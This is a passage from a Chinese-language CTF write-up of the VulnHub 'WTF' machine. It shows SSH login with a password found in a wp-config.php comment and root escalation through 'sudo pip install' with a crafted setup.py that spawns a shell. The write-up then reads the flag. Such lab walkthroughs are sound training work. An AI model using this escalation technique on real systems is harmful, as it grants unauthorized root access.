        define( 'ABSPATH', dirname( __FILE__ ) . '/' );
}

/** Sets up WordPress vars and included files. */
require_once( ABSPATH . 'wp-settings.php' );

//`Db]f{He3HgO`(z
```

将其中的ra/912391929129连接ssh发现连接不上，再将ra/`Db]f{He3HgO`(z连接ssh，成功登录，真想说一句what the fuck!!!!!!

``` bash
root@kali:~# ssh ra@192.168.1.15
The authenticity of host '192.168.1.15 (192.168.1.15)' can't be established.
ECDSA key fingerprint is SHA256:YRICww0bKH3fcEIycw4x9iWEv3gF1qtqElE7ecocCn8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.1.15' (ECDSA) to the list of known hosts.
ra@192.168.1.15's password: 
Linux wtf 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Nov 21 12:47:56 2019 from 192.168.1.13
ra@wtf:~$ ls
ra@wtf:~$ id
uid=1000(ra) gid=1000(ra) groups=1000(ra),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
ra@wtf:~$ pwd
/home/ra
ra@wtf:~$ whoami
ra
ra@wtf:~$ ls -la
total 28
drwxr-xr-x 3 ra   ra   4096 Nov 21 15:04 .
drwxr-xr-x 3 root root 4096 Nov 21 06:45 ..
-rw------- 1 ra   ra    480 Nov 21 15:01 .bash_history
-rw-r--r-- 1 ra   ra    220 Nov 21 06:45 .bash_logout
-rw-r--r-- 1 ra   ra   3526 Nov 21 06:45 .bashrc
drwx------ 3 ra   ra   4096 Nov 21 14:18 .gnupg
-rw-r--r-- 1 ra   ra    807 Nov 21 06:45 .profile
ra@wtf:~$
```

``` bash
ra@wtf:~$ sudo -l
Matching Defaults entries for ra on wtf:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ra may run the following commands on wtf:
    (root) NOPASSWD: /usr/bin/pip
```

发现/usr/bin/pip可以以root用户的权限执行，网上搜索利用方法，传送门[GTFOBins](https://gtfobins.github.io/)

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub93.jpg)

``` bash
ra@wtf:~$ TF=$(mktemp -d)
ra@wtf:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
ra@wtf:~$ sudo pip install $TF
Processing /tmp/tmp.FbYhS1oIjc
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# 
```

运行poc后成功提权,然后找到flag


``` bash
# cd /root
# ls
flag.txt
# cat flag.txt
WTF rooted!
haha, well done. 
You can find me on discord to tell me your opinion about "WTF" -> pwn4magic#8707
#
```

帅的掉渣

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub94.jpg)

<font color="red">Game over</font>

不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this...It's a pity...

![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg)

<font color="green">***The end,to be continue...***</font>
<!-- kb:end WTF-1 -->

</details>

